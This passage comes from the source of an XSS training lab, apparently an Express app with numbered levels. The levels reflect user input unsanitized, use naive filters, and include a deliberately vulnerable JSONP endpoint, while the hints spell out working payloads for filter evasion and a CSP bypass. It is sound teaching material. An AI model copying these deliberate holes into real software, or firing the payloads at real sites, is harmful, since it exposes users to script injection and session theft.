      setTimeout(() => t.classList.remove('show'), 3000);
    }

    // ── Init ─────────────────────────────────────────────────────
    (async () => {
      const solved = await loadProgress();
      renderGrid(solved);
      if (solved.length > 0) showToast(\`Clearance loaded. \${solved.length} module(s) secured.\`);
    })();
  </script>
</body>

</html>`);
});

// ============================================================
// SHARED HELPERS
// ============================================================
function levelPage(title, levelNum, difficulty, defenses, hint, bodyContent) {
  const hintEncoded = Buffer.from(hint).toString('base64');
  const diffClass = { Easy: 'diff-easy', Medium: 'diff-medium', Hard: 'diff-hard', Expert: 'diff-expert' }[difficulty] || '';
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Level ${levelNum} - ${title}</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg-deep: #03040b;
      --bg-panel: rgba(10, 12, 27, 0.6);
      --bg-elev: rgba(10, 12, 27, 0.8);
      --border: rgba(0, 243, 255, 0.2);
      --text: #e0f2fe;
      --text-dim: #7dd3fc;
      --neon-ok: #00ffa3;
      --neon-warn: #fde047;
      --neon-bad: #fb7185;
      --accent: #00f3ff;
      --mono: 'JetBrains Mono', ui-monospace, monospace;
      --sans: 'Rajdhani', 'Segoe UI', system-ui, sans-serif;
      --head: 'Orbitron', sans-serif;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: var(--sans);
      background-color: var(--bg-deep);
      color: var(--text);
      min-height: 100vh;
      line-height: 1.5;
      background-image:
        radial-gradient(circle at 15% 50%, rgba(176, 38, 255, 0.05), transparent 25%),
        radial-gradient(circle at 85% 30%, rgba(0, 243, 255, 0.05), transparent 25%);
    }
    .success-banner {
      display: none; position: fixed; top: 0; left: 0; right: 0; padding: 1rem;
      background: linear-gradient(90deg, #1a472a, #238636); color: #fff;
      text-align: center; font-weight: 700; font-size: 1rem; z-index: 10000;
      animation: slideDown 0.35s ease; align-items: center; justify-content: center; gap: 1.25rem;
      font-family: var(--mono);
      border-bottom: 1px solid var(--neon-ok);
      box-shadow: 0 4px 24px rgba(63, 185, 80, 0.25);
    }
    .success-banner a {
      color: #fff; background: rgba(0,0,0,0.25); padding: 0.4rem 1rem; border-radius: 6px;
      text-decoration: none; font-size: 0.8rem; font-weight: 600; border: 1px solid rgba(255,255,255,0.2);
    }
    .success-banner a:hover { background: rgba(0,0,0,0.4); }
    @keyframes slideDown { from { transform: translateY(-100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    @keyframes pulse-dot {
      0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(63, 185, 80, 0.5); }
      50% { opacity: 0.85; box-shadow: 0 0 12px 4px rgba(63, 185, 80, 0.35); }
    }
    .cyber-shell { min-height: 100vh; display: flex; flex-direction: column; }
    .cyber-top {
      flex-shrink: 0;
      display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.75rem;
      padding: 0.85rem 1.25rem;
      background: var(--bg-panel);
      backdrop-filter: blur(10px);
      border-bottom: 1px solid var(--border);
      font-family: var(--mono);
      font-size: 0.72rem;
      letter-spacing: 0.06em;
      text-transform: uppercase;
      color: var(--text-dim);
    }
    .cyber-brand { display: flex; align-items: center; gap: 0.65rem; color: var(--text); }
    .cyber-brand strong { color: var(--accent); font-family: var(--head); font-weight: 700; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0, 243, 255, 0.5); }
    .sse-pill {
      display: inline-flex; align-items: center; gap: 0.45rem;
      padding: 0.25rem 0.65rem; border-radius: 4px; border: 1px solid var(--border);
      background: rgba(63, 185, 80, 0.06);
    }
    .sse-dot {
      width: 8px; height: 8px; border-radius: 50%; background: var(--neon-warn);
      transition: background 0.2s, box-shadow 0.2s;
    }
    .sse-dot.live { background: var(--neon-ok); animation: pulse-dot 1.8s ease-in-out infinite; }
    .sse-dot.err { background: var(--neon-bad); animation: none; }
    .lab-split {
      flex: 1;
      display: grid;
      grid-template-columns: 1fr;
      grid-template-rows: minmax(0, 1fr) 350px;
      gap: 0;
      min-height: 0;
    }
    @media (max-width: 1024px) {
      .lab-split { grid-template-rows: minmax(0, 1fr) 300px; }
      .lab-terminal { max-height: 45vh; }
    }
    .lab-main {
      padding: 1.25rem 1.5rem 2rem;
      overflow-y: auto;
    }
    .nav { margin-bottom: 1.25rem; font-family: var(--mono); font-size: 0.75rem; }
    .nav a { color: var(--accent); text-decoration: none; }
    .nav a:hover { text-decoration: underline; }
    .level-header { margin-bottom: 1.25rem; }
    .level-header .badge {
      display: inline-block; font-size: 0.65rem; font-weight: 700; text-transform: uppercase;
      letter-spacing: 0.12em; padding: 0.3rem 0.75rem; border-radius: 2px; margin-bottom: 0.65rem;
      font-family: var(--mono);
    }
    .diff-easy .badge { background: rgba(63, 185, 80, 0.12); color: var(--neon-ok); border: 1px solid rgba(63, 185, 80, 0.45); }
    .diff-medium .badge { background: rgba(210, 153, 34, 0.12); color: var(--neon-warn); border: 1px solid rgba(210, 153, 34, 0.45); }
    .diff-hard .badge { background: rgba(248, 81, 73, 0.12); color: var(--neon-bad); border: 1px solid rgba(248, 81, 73, 0.45); }
    .diff-expert .badge { background: rgba(188, 77, 255, 0.1); color: #bc4dff; border: 1px solid rgba(188, 77, 255, 0.45); }
    .level-header h1 { font-family: var(--head); letter-spacing: 1px; font-size: 1.5rem; color: #fff; text-shadow: 0 0 10px rgba(0,243,255,0.5); margin-bottom: 0.4rem; font-weight: 700; text-transform: uppercase; }
    .defenses { font-size: 0.82rem; color: var(--text-dim); font-family: var(--mono); }
    .defenses strong { color: var(--text); }
    .challenge-area {
      background: var(--bg-elev); border: 1px solid var(--border); border-radius: 8px;
      padding: 1.35rem; margin-bottom: 1.25rem;
    }
    form { display: flex; gap: 0.65rem; margin-bottom: 1rem; flex-wrap: wrap; }
    input[type="text"], textarea {
      flex: 1; min-width: 220px; padding: 0.55rem 0.85rem;
      background: var(--bg-panel); border: 1px solid var(--border); border-radius: 6px;
      color: var(--text); font-size: 0.88rem; font-family: var(--mono);
    }
    input[type="text"]:focus, textarea:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 2px rgba(88, 166, 255, 0.15); }
    button {
      padding: 0.55rem 1.25rem; background: rgba(63, 185, 80, 0.15); border: 1px solid var(--neon-ok);
      border-radius: 6px; color: var(--neon-ok); font-size: 0.8rem; font-weight: 600; cursor: pointer;
      font-family: var(--mono); text-transform: uppercase; letter-spacing: 0.04em;
    }
    button:hover { background: rgba(63, 185, 80, 0.28); }
    .output {
      padding: 1rem; background: var(--bg-panel); border: 1px solid var(--border); border-radius: 6px;
      min-height: 2.5rem; word-break: break-word; font-family: var(--mono); font-size: 0.82rem;
    }
    .hint { margin-top: 1rem; }
    .hint details { background: var(--bg-elev); border: 1px solid var(--border); border-radius: 8px; padding: 1rem; }
    .hint summary { cursor: pointer; color: var(--neon-warn); font-weight: 600; font-size: 0.85rem; font-family: var(--mono); }
    .hint p { margin-top: 0.65rem; font-size: 0.82rem; color: var(--text-dim); line-height: 1.65; }
    .hint code { background: var(--bg-panel); padding: 0.12rem 0.35rem; border-radius: 4px; font-size: 0.78rem; color: var(--text); font-family: var(--mono); }
    .intel-wrap {
      display: none; margin-top: 1.5rem;
      border: 1px solid rgba(210, 153, 34, 0.35);
      border-radius: 8px;
      background:
        linear-gradient(135deg, rgba(13, 17, 23, 0.97) 0%, rgba(22, 27, 34, 0.98) 50%, rgba(13, 17, 23, 0.97) 100%),
        repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(210, 153, 34, 0.03) 2px, rgba(210, 153, 34, 0.03) 4px);
      position: relative; overflow: hidden;
    }
    .intel-wrap::before {
      content: 'CLASSIFIED // INTEL // DECRYPTED';
      display: block; font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.2em;
      color: var(--neon-warn); padding: 0.5rem 1rem; border-bottom: 1px dashed rgba(210, 153, 34, 0.25);
      background: rgba(210, 153, 34, 0.06);
    }
    .intel-inner { padding: 1.25rem 1.35rem 1.5rem; }
    .intel-wrap h2 { font-size: 1.05rem; color: #e6edf3; margin-bottom: 1rem; font-weight: 600; }
    .intel-wrap h3 {
      font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.14em;
      color: var(--neon-ok); margin-top: 1.1rem; margin-bottom: 0.45rem; font-family: var(--mono);
    }
    .intel-wrap h3:first-of-type { margin-top: 0; }
    .intel-wrap p { font-size: 0.84rem; color: var(--text); line-height: 1.75; }
    .intel-wrap code { background: var(--bg-panel); padding: 0.12rem 0.35rem; border-radius: 3px; font-size: 0.78rem; color: #f0f6fc; font-family: var(--mono); border: 1px solid var(--border); }
    .lab-terminal {
      display: flex; flex-direction: column;
      background: #0a0a0a;
      border-top: 2px solid var(--neon-cyan);
      min-height: 0;
    }
    .term-head {
      flex-shrink: 0;
      display: flex;
      align-items: center;
      padding: 0.5rem 1rem;
      background: #161b22;
      border-bottom: 1px solid #30363d;
    }
    .term-controls {
      display: flex;
      gap: 6px;
      margin-right: 15px;
    }
    .term-btn {
      width: 12px;
      height: 12px;
      border-radius: 50%;
    }
    .term-btn.close { background: #ff5f56; }
    .term-btn.min { background: #ffbd2e; }
    .term-btn.max { background: #27c93f; }
    .term-title {
      color: #e0f2fe;
      font-family: var(--mono);
      font-size: 0.75rem;
      letter-spacing: 1px;
      text-transform: lowercase;
    }
    .term-title span { color: var(--neon-purple); }
    .term-body {
      flex: 1; overflow: auto; padding: 1rem;
      font-family: var(--mono); font-size: 0.75rem; line-height: 1.45;
      background: rgba(0, 0, 0, 0.85);
      box-shadow: inset 0 0 20px rgba(0, 0, 0, 1);
    }
    .term-line {
      margin-bottom: 0.25rem;
      padding: 0.2rem 0;
      white-space: pre-wrap; word-break: break-word; color: #e0e0e0;
    }
    .term-line::before {
      content: 'root@sec-lab:~# ';
      color: var(--neon-cyan);
      font-weight: 700;
      margin-right: 5px;
    }
    .term-meta {
      font-size: 0.65rem; color: #666;
      display: block;
      margin-bottom: 0.1rem;
    }
    .term-line.raw::before { color: #79c0ff; }
    .term-line.raw { color: #79c0ff; }
    .term-line.filter::before { color: #e3b341; }
    .term-line.filter { color: #e3b341; }
    .term-line.decode::before { color: #a371f7; }
    .term-line.decode { color: #d2a8ff; }
    .term-line.info::before { color: var(--text-dim); }
    .term-line.info { color: var(--text-dim); }
    .term-line.success::before { color: var(--neon-ok); }
    .term-line.success { color: var(--neon-ok); }
    .term-line.warn::before { color: var(--neon-warn); }
    .term-line.warn { color: var(--neon-warn); }
    .term-meta { font-size: 0.62rem; color: var(--text-dim); margin-bottom: 0.25rem; letter-spacing: 0.08em; }
  </style>
</head>
<body class="${diffClass}">
  <div class="success-banner" id="successBanner">
    <span>XSS Triggered! Level ${levelNum} Complete!</span>
    <a href="/">Dashboard</a>
    ${levelNum < 23 ? `<a href="/level/${levelNum + 1}">Next Level &rarr;</a>` : '<a href="/">All Done!</a>'}
  </div>
  <script>
    (function() {
      var solved = false;
      var levelNum = ${levelNum};
      function onSolve() {
        if (solved) return;
        solved = true;
        document.getElementById('successBanner').style.display = 'flex';
        var payload = new URLSearchParams(location.search).get('q')
          || new URLSearchParams(location.search).get('url')
          || location.hash.substring(1)
          || '(console/postMessage payload)';
        fetch('/api/solve', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ level: levelNum, payload: payload, url: location.href })
        }).then(function(r) { return r.json(); }).then(function(data) {
          if (data.writeup) {
            var w = document.getElementById('writeupSection');
            if (w) {
              w.style.display = 'block';
              document.getElementById('writeupTitle').innerHTML = data.writeup.title;
              document.getElementById('writeupWhy').innerHTML = data.writeup.why;
              document.getElementById('writeupLesson').innerHTML = data.writeup.lesson;
              document.getElementById('writeupReal').innerHTML = data.writeup.realWorld;
            }
          }
        }).catch(function(){});
      }
      var _alert = window.alert;
      window.alert = function() { onSolve(); _alert.apply(window, arguments); };
      var _confirm = window.confirm;
      window.confirm = function() { onSolve(); return _confirm.apply(window, arguments); };
      var _prompt = window.prompt;
      window.prompt = function() { onSolve(); return _prompt.apply(window, arguments); };
    })();
  </script>
  <div class="cyber-shell">
    <header class="cyber-top">
      <div class="cyber-brand">
        <strong>ARTSEC</strong>
        <span>XSS Lab // Level ${levelNum}</span>
      </div>
      <div class="sse-pill" title="Server-Sent Events stream to backend interceptor">
        <span class="sse-dot" id="sseDot" aria-hidden="true"></span>
        <span id="sseLabel">INTERCEPTOR</span>
      </div>
    </header>
    <div class="lab-split">
      <main class="lab-main">
        <div class="nav"><a href="/">&larr; Dashboard</a> &nbsp;&middot;&nbsp; <a href="/cheatsheet">Cheat Sheet</a></div>
        <div class="level-header">
          <span class="badge">Level ${levelNum} &mdash; ${difficulty}</span>
          <h1>${title}</h1>
          <p class="defenses"><strong>Defenses:</strong> ${defenses}</p>
        </div>
        <div class="challenge-area">
          ${bodyContent}
        </div>
        <div class="hint">
          <details id="hintBox">
            <summary>Hint (try on your own first!)</summary>
            <p id="hintContent"></p>
          </details>
        </div>
        <div class="intel-wrap" id="writeupSection">
          <div class="intel-inner">
            <h2 id="writeupTitle"></h2>
            <h3>Why It Worked</h3>
            <p id="writeupWhy"></p>
            <h3>Key Lesson</h3>
            <p id="writeupLesson"></p>
            <h3>Real-World Application</h3>
            <p id="writeupReal"></p>
          </div>
        </div>
      </main>
      <aside class="lab-terminal" aria-label="Live backend interceptor log">
        <div class="term-head">
          <div class="term-controls">
            <div class="term-btn close"></div>
            <div class="term-btn min"></div>
            <div class="term-btn max"></div>
          </div>
          <div class="term-title">root@<span>interceptor</span>: ~</div>
        </div>
        <div class="term-body" id="terminalStream"></div>
      </aside>
    </div>
  </div>
  <script>
    document.getElementById('hintBox').addEventListener('toggle', function() {
      if (!this.open) return;
      var el = document.getElementById('hintContent');
      if (el.dataset.loaded) return;
      el.dataset.loaded = '1';
      el.innerHTML = atob('${hintEncoded}');
    });
    (function terminalSSE() {
      var level = ${levelNum};
      var box = document.getElementById('terminalStream');
      var dot = document.getElementById('sseDot');
      var label = document.getElementById('sseLabel');
      function appendEntry(o) {
        var line = document.createElement('div');
        var t = (o.type || 'info').toLowerCase();
        if (['raw','filter','decode','info','success','warn'].indexOf(t) === -1) t = 'info';
        line.className = 'term-line ' + t;
        var meta = document.createElement('div');
        meta.className = 'term-meta';
        var d = new Date(o.ts || Date.now());
        meta.textContent = d.toISOString().replace('T', ' ').slice(0, 19) + ' UTC · ' + String(t).toUpperCase() + ' · L' + (o.level != null ? o.level : '?');
        line.appendChild(meta);
        line.appendChild(document.createTextNode(o.message || ''));
        box.appendChild(line);
        box.scrollTop = box.scrollHeight;
      }
      var url = '/api/terminal-stream?level=' + encodeURIComponent(level);
      var es = new EventSource(url);
      es.onopen = function() {
        dot.classList.add('live');
        dot.classList.remove('err');
        label.textContent = 'STREAM LIVE';
      };
      es.onerror = function() {
        dot.classList.remove('live');
        dot.classList.add('err');
        label.textContent = 'RECONNECTING';
      };
      es.onmessage = function(ev) {
        try { appendEntry(JSON.parse(ev.data)); } catch (e) {}
      };
    })();
  </script>
  ${solutions[levelNum] && writeups[levelNum] ? `<script>
    (function(){
      document.getElementById('successBanner').style.display = 'flex';
      var w = document.getElementById('writeupSection');
      w.style.display = 'block';
      document.getElementById('writeupTitle').innerHTML = ${JSON.stringify(writeups[levelNum].title)};
      document.getElementById('writeupWhy').innerHTML = ${JSON.stringify(writeups[levelNum].why)};
      document.getElementById('writeupLesson').innerHTML = ${JSON.stringify(writeups[levelNum].lesson)};
      document.getElementById('writeupReal').innerHTML = ${JSON.stringify(writeups[levelNum].realWorld)};
    })();
  </script>` : ''}
</body>
</html>`;
}

// ============================================================
// LEVEL 1 - Basic Reflected XSS (no filter)
// ============================================================
app.get('/level/1', (req, res) => {
  logRawRequest(1, req);
  const q = req.query.q || '';
  logFilterLogic(1, 'Server filter', q, q, { note: 'No encoding or sanitization — reflected verbatim into HTML.' });
  const output = q ? `<div class="output"><p>Search results for: ${q}</p></div>` : '';
  res.send(levelPage(
    'Hello, Reflected XSS', 1, 'Easy',
    'None &mdash; your input is reflected directly into HTML with zero filtering.',
    'Try injecting an HTML tag that executes JavaScript. The simplest payload: <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Enter a search term. Your input appears in the page below.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Search..." value="">
      <button type="submit">Search</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 2 - Stored XSS (Guestbook, no filter)
// ============================================================
app.get('/level/2', (req, res) => {
  logRawRequest(2, req);
  logToTerminal(2, 'info', { note: 'GET /level/2 — rendering guestbook; stored entries echoed without sanitization.', entries: guestbook.length });
  const entries = guestbook.map(e => `<div style="padding:0.75rem;border-bottom:1px solid #21262d;"><strong style="color:#58a6ff;">${e.name}</strong><p style="margin-top:0.25rem;">${e.message}</p></div>`).join('');
  const hasEntries = guestbook.length > 0;
  res.send(levelPage(
    'Stored XSS Guestbook', 2, 'Easy',
    'None &mdash; input is stored and rendered without any sanitization.',
    'Just like Level 1, but your payload persists. Try putting a <code>&lt;script&gt;</code> tag in the message field. It will fire every time someone visits.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Leave a message in the guestbook. ${hasEntries ? '<strong style="color:#f85149;">Note: If the success banner appeared immediately, you already have a working XSS payload stored. Clear the guestbook to start fresh.</strong>' : ''}</p>
    <form method="POST" action="/level/2">
      <input type="text" name="name" placeholder="Your name" style="max-width:200px;">
      <input type="text" name="message" placeholder="Your message" style="flex:2;">
      <button type="submit">Post</button>
    </form>
    <div style="margin-top:1rem;">${entries || '<p style="color:#484f58;">No entries yet.</p>'}</div>
    <form method="POST" action="/level/2/clear" style="margin-top:1rem;"><button type="submit" style="background:#da3633;border-color:#f85149;color:#fff;">Clear Guestbook</button></form>`
  ));
});

app.post('/level/2', (req, res) => {
  logRawRequest(2, req);
  const { name, message } = req.body;
  const before = JSON.stringify({ name: name || '', message: message || '' });
  if (name && message) guestbook.push({ name, message });
  logFilterLogic(2, 'Store guestbook entry', before, name && message ? 'Appended to in-memory guestbook[]' : 'Ignored (missing fields)');
  res.redirect('/level/2');
});

app.post('/level/2/clear', (req, res) => {
  logRawRequest(2, req);
  logToTerminal(2, 'warn', { action: 'Guestbook cleared', beforeCount: guestbook.length, afterCount: 0 });
  guestbook.length = 0;
  res.redirect('/level/2');
});

// ============================================================
// LEVEL 3 - <script> tag blocked (case-insensitive)
// ============================================================
app.get('/level/3', (req, res) => {
  logRawRequest(3, req);
  const rawQ = req.query.q || '';
  let q = rawQ;
  const beforeScriptStrip = q;
  q = q.replace(/<\/?script\b[^>]*>/gi, '');
  logFilterLogic(3, 'Regex: /<\\/?script\\b[^>]*>/gi', beforeScriptStrip, q, { note: 'Script tags removed; other HTML retained.' });
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage(
    'Script Tag Blocked', 3, 'Medium',
    '<code>&lt;script&gt;</code> tags are stripped (case-insensitive regex).',
    'The &lt;script&gt; tag is blocked, but many other HTML elements can execute JavaScript. Try <code>&lt;img src=x onerror=alert("XSS")&gt;</code> or <code>&lt;svg onload=alert("XSS")&gt;</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">The server removes &lt;script&gt; tags. Find another vector.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 4 - Attribute injection context
// ============================================================
app.get('/level/4', (req, res) => {
  logRawRequest(4, req);
  const q = req.query.q || '';
  logFilterLogic(4, 'Attribute context — no encoding', q, q, { note: 'Value placed inside double-quoted HTML attribute.' });
  res.send(levelPage(
    'Attribute Injection', 4, 'Medium',
    'Input is placed inside an HTML attribute value (double-quoted). No tag filtering.',
    'Your input is inside a <code>value="..."</code> attribute. Close the attribute with <code>"</code>, then add an event handler like <code>" onfocus=alert("XSS") autofocus="</code> or close the tag entirely with <code>"&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input is reflected into an input element's value attribute.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Type here..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" style="margin-top:1rem;">
      <p>Reflected element:</p>
      <input type="text" value="${q}" style="width:100%;padding:0.5rem;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;">
    </div>`
  ));
});

// ============================================================
// LEVEL 5 - JavaScript string context
// ============================================================
app.get('/level/5', (req, res) => {
  logRawRequest(5, req);
  const rawQ = req.query.q || '';
  let q = rawQ;
  q = q.replace(/</g, '&lt;').replace(/>/g, '&gt;');
  logFilterLogic(5, 'HTML-encode < and > for JS string context', rawQ, q, { note: 'Angle brackets become entities; string still injectable.' });
  res.send(levelPage(
    'JavaScript Context', 5, 'Medium',
    'Angle brackets <code>&lt; &gt;</code> are HTML-encoded. Your input lands inside a JS string literal.',
    'You can\'t create new tags, but you\'re inside a JS string. Close the string with <code>\'</code>, then inject code: <code>\';alert("XSS");//</code>. The <code>//</code> comments out the rest of the line.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input is placed inside a JavaScript string variable. Angle brackets are encoded.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" style="margin-top:1rem;">
      <p>Check the page source to see where your input lands.</p>
    </div>
    <script>
      var userData = '${q}';
      document.querySelector('.output').innerHTML += '<p>User data: ' + userData + '</p>';
    </script>`
  ));
});

// ============================================================
// LEVEL 6 - Common event handlers blocked
// ============================================================
app.get('/level/6', (req, res) => {
  logRawRequest(6, req);
  let q = req.query.q || '';
  const s0 = q;
  q = q.replace(/<\/?script\b[^>]*>/gi, '');
  logFilterLogic(6, 'Strip <script> tags', s0, q);
  const s1 = q;
  q = q.replace(/\bon(error|load|click|mouseover|mouseout|focus|blur|input|change|submit|keydown|keyup|keypress)\s*=/gi, '');
  logFilterLogic(6, 'Strip blocklisted on* handlers', s1, q, { note: 'Obscure handlers (ontoggle, onstart, …) not matched.' });
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage(
    'Event Handler Blocklist', 6, 'Hard',
    '<code>&lt;script&gt;</code> tags stripped. Common event handlers (<code>onerror, onload, onclick, onmouseover, onfocus, onblur, oninput, onchange, onsubmit, onkeydown, onkeyup, onkeypress</code>) are stripped.',
    'Many obscure event handlers exist beyond the common ones. Try: <code>&lt;details open ontoggle=alert("XSS")&gt;&lt;summary&gt;X&lt;/summary&gt;&lt;/details&gt;</code> or <code>&lt;marquee onstart=alert("XSS")&gt;</code> or <code>&lt;body onpageshow=alert("XSS")&gt;</code> or <code>&lt;video&gt;&lt;source onerror=alert("XSS")&gt;&lt;/video&gt;</code>... wait, onerror is blocked. Think about which handlers are NOT in the blocklist.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Common event handlers are stripped. Find an obscure one.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 7 - Aggressive keyword stripping + case insensitive
// ============================================================
app.get('/level/7', (req, res) => {
  logRawRequest(7, req);
  const rawQ = req.query.q || '';
  let q = rawQ;
  q = q.replace(/script/gi, '')
       .replace(/alert/gi, '')
       .replace(/onerror/gi, '')
       .replace(/onload/gi, '')
       .replace(/onclick/gi, '')
       .replace(/onfocus/gi, '')
       .replace(/onmouseover/gi, '')
       .replace(/javascript/gi, '')
       .replace(/eval/gi, '')
       .replace(/prompt/gi, '')
       .replace(/confirm/gi, '');
  logFilterLogic(7, 'Single-pass keyword strip (case-insensitive)', rawQ, q, { note: 'Order: script, alert, onerror, … — nesting can reassemble tokens.' });
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage(
    'Case & Keyword Filter', 7, 'Hard',
    'Keywords stripped (single pass, case-insensitive): <code>script, alert, onerror, onload, onclick, onfocus, onmouseover, javascript, eval, prompt, confirm</code>.',
    'The filter does a <strong>single pass</strong> strip. If you nest the keyword inside itself, the outer parts reassemble after the inner one is removed. Try: <code>&lt;img src=x onerronerrorr=alalertert("XSS")&gt;</code>. Also consider: <code>&lt;svg/onloaonloadd=alealertrt(1)&gt;</code>. The key insight: <code>onerronerrorr</code> &rarr; strip "onerror" from inside &rarr; <code>onerror</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Dangerous keywords are stripped in a single pass. Can you reconstruct them?</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 8 - DOM-based XSS (no server reflection)
// ============================================================
app.get('/level/8', (req, res) => {
  logRawRequest(8, req);
  logToTerminal(8, 'info', { note: 'No server-side reflection of user input. Sink: location.hash → innerHTML (client-only).' });
  res.send(levelPage(
    'DOM-Based XSS', 8, 'Hard',
    'No server-side reflection. Vulnerability is in client-side JavaScript that reads from <code>location.hash</code>.',
    'The client-side JS reads <code>location.hash</code> and writes it to the DOM via <code>innerHTML</code>. Try navigating to <code>/level/8#&lt;img src=x onerror=alert("XSS")&gt;</code>. The hash is never sent to the server, making this invisible to server-side filters.',
    `<p style="color:#8b949e;margin-bottom:1rem;">This page has no server-side reflection. The vulnerability is entirely in the client-side JavaScript. Check the source!</p>
    <p style="color:#8b949e;margin-bottom:1rem;">Use the URL hash (#) to inject content.</p>
    <div class="output" id="domOutput">
      <p style="color:#484f58;">Waiting for hash input...</p>
    </div>
    <script>
      // Vulnerable client-side code
      function renderHash() {
        var hash = decodeURIComponent(location.hash.substring(1));
        if (hash) {
          document.getElementById('domOutput').innerHTML = '<p>Welcome, ' + hash + '!</p>';
        }
      }
      window.addEventListener('hashchange', renderHash);
      renderHash();
    </script>`
  ));
});

// ============================================================
// LEVEL 9 - href injection with protocol filter
// ============================================================
app.get('/level/9', (req, res) => {
  logRawRequest(9, req);
  let url = req.query.url || '';
  let filtered = url.replace(/<\/?script\b[^>]*>/gi, '');
  logFilterLogic(9, 'Strip <script> tags', url, filtered);
  const u1 = filtered;
  filtered = filtered.replace(/\bon\w+\s*=/gi, '');
  logFilterLogic(9, 'Strip on* event handlers (regex)', u1, filtered);
  const blocked = /javascript:/i.test(filtered);
  logToTerminal(9, blocked ? 'warn' : 'success', { step: 'Naive javascript: check (regex /javascript:/i)', candidate: filtered, blocked });
  const output = blocked
    ? `<div class="output"><p style="color:#f85149;">Blocked: "javascript:" protocol detected.</p></div>`
    : url ? `<div class="output"><p>Click the link: <a href="${filtered}">Visit Link</a></p></div>` : '';
  res.send(levelPage(
    'href Injection with Filters', 9, 'Expert',
    '<code>&lt;script&gt;</code> stripped, event handlers stripped, <code>javascript:</code> protocol blocked (case-insensitive check).',
    'The filter checks for <code>javascript:</code> case-insensitively, but what about tab/newline characters within the keyword? Try: <code>java&#x09;script:alert("XSS")</code> using URL-encoded tab: <code>java%09script:alert(1)</code>. Or use HTML entity encoding in the href: <code>&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)</code>. The browser decodes HTML entities in attribute values before interpreting the URL scheme.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Provide a URL to create a link. The server blocks &lt;script&gt;, event handlers, and the javascript: protocol.</p>
    <form method="GET">
      <input type="text" name="url" placeholder="Enter URL..." value="">
      <button type="submit">Create Link</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 10 - CSP Bypass
// ============================================================
app.get('/level/10', (req, res) => {
  logRawRequest(10, req);
  const q = req.query.q || '';
  logFilterLogic(10, 'Body reflection (no strip)', q, q, { note: "Same-origin /api/jsonp can satisfy script-src 'self' if loaded via <script src>." });
  const nonce = Math.random().toString(36).substring(2, 15);
  logToTerminal(10, 'info', { 'Content-Security-Policy': `script-src 'nonce-${nonce}' 'self'` });
  const html = levelPage(
    'CSP Bypass', 10, 'Expert',
    `Content-Security-Policy: <code>script-src 'nonce-${nonce}' 'self'</code>. Only nonced scripts and same-origin scripts are allowed.`,
    'The CSP allows <code>\'self\'</code> as a script source. The <code>/api/jsonp</code> endpoint reflects a callback parameter without sanitization. You can use it as a script source: <code>&lt;script src="/api/jsonp?callback=alert(1)//"&gt;&lt;/script&gt;</code>. The JSONP endpoint returns executable JS with your callback, and since it\'s same-origin, the CSP allows it.',
    `<p style="color:#8b949e;margin-bottom:1rem;">A strict Content-Security-Policy is in place. Inline scripts without the nonce will be blocked by the browser.</p>
    <p style="color:#8b949e;margin-bottom:1rem;">Interesting: there's an API endpoint at <code>/api/jsonp?callback=myFunction</code> on this same origin...</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output">${q ? `<p>Result: ${q}</p>` : ''}</div>`
  );
  res.set('Content-Security-Policy', `script-src 'nonce-${nonce}' 'self'`);
  // Patch the script tags in our template to include the nonce
  res.send(html.replace(/<script>/g, `<script nonce="${nonce}">`));
});

// JSONP endpoint (intentionally vulnerable - used by Level 10)
app.get('/api/jsonp', (req, res) => {
  logRawRequest(10, req);
  const callback = req.query.callback || 'callback';
  logFilterLogic(10, 'JSONP — unsanitized callback into JS body', callback, `${callback}({"status":"ok"})`, { mime: 'application/javascript' });
  res.type('application/javascript');
  res.send(`${callback}({"status":"ok"})`);
